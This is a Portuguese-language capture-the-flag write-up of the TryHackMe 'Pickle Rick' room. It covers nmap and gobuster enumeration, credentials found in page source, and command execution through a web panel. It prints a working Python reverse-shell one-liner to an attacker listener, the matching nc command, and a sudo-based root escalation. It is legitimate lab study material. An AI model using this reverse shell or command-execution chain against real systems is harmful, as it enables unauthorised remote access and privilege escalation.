# Pickle Rick

## config VPN

- [https://tryhackme.com/access](https://tryhackme.com/access)

![Untitled](Untitled.png)

```bash
	sudo openvpn file.ovpn
```

![Untitled](Untitled%201.png)

![Untitled](Untitled%202.png)

## What is the first ingredient that Rick needs?

- nmap no ip
    
    ```bash
    sudo nmap -sV -O 10.10.37.36
    ```
    
- Tem um servidor http aberto
- Vamos ver
    
    ![Untitled](Untitled%203.png)
    
- No codigo fonte temos
    
    ![Untitled](Untitled%204.png)
    
    ```html
    <!--
    Note to self, remember username!
    
        Username: R1ckRul3s
    -->
    ```
    
- Ja temos o Username de alguma coisa
- Vamos ver se existe mais diretorios
    
    ```bash
    gobuster -u http://10.10.228.131/ -w /wordlist/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
    ```
    
    ![Untitled](Untitled%205.png)
    
- Vamos ver esses diretorios
    - robots.txt
        
        ![Untitled](Untitled%206.png)
        
    - assets
        
        ![Untitled](Untitled%207.png)
        
    - login.php
        
        ![Untitled](Untitled%208.png)
        
- Bom vamos testar o usuario e o valor mostrado por robots.txt
    
    ![Untitled](Untitled%209.png)
    
- Vamos testar qualquer comando
    
    ```bash
    ls
    ```
    
    ![Untitled](Untitled%2010.png)
    
- Vamos ver o que tem nesse .txt
    
    ![Untitled](Untitled%2011.png)
    
- Temos nosso primeiro ingrediente

## What is the second ingredient in Rick’s potion?

- Testando alguns comandos como
    
    ```bash
    cd ..
    ls /home
    ls /home/rick
    cat /home/rick/secon*
    ```
    
- Vemos que nao eh possivel acessar
- Vamos testar algo entao
    
    ```bash
    grep -R .
    ```
    
    | -R | recursive |
    | --- | --- |
    | . | na pasta atual |
    
    ![Untitled](Untitled%2012.png)
    
- Abrindo o html
    
    ![Untitled](Untitled%2013.png)
    
- Ou seja ele ta tratando alguns valores
- Entao vamos testar mais coisas no `Command Panel`
    
    ```bash
    python -c "print('hello')"
    python3 -c "print('hello')"
    ```
    
    ![Untitled](Untitled%2014.png)
    
- Entao podemos rodar python3 nessa aplicacao
- Vamos fazer um reverse shell
    - [https://github.com/cwinfosec/pentestmonkey/blob/master/Reverse_Shell_Cheat_Sheet.md](https://github.com/cwinfosec/pentestmonkey/blob/master/Reverse_Shell_Cheat_Sheet.md)
- Antes vamos abrir nossa porta com o `nc`
    
    ```bash
    sudo nc -nvlp 777 -s 10.8.154.250
    ```
    
- Agora na aplicacao
    
    ```bash
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.154.250",777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```
    
- Entao temos uma conexao
- Vamos ver quem somos e verificar o arquivo que nao conseguimos ver anteriormente
    
    ![Untitled](Untitled%2015.png)
    
    ```bash
    cd /home/rick
    ls
    cat sec*
    ```
    
- Temos nosso segundo ingrediente

## What is the last and final ingredient?

- Agora vamos ver na pasta root
    
    ```bash
    ls /root
    ```
    
- Nao temos permissao
- Entao vamos elevar nosso privilegio
    
    [https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4)
    
    ```bash
    sudo -l
    sudo su
    whoami
    ```
    
- Agora que somos root vamos ver o que tem na pasta root
    
    ```bash
    ls /root
    ```
    
    ![Untitled](Untitled%2016.png)
    
- Vamos ver esse txt
    
    ```bash
    cat /root/3rd.txt
    ```
    
    ![Untitled](Untitled%2017.png)
    
- Nosso terceiro ingrediente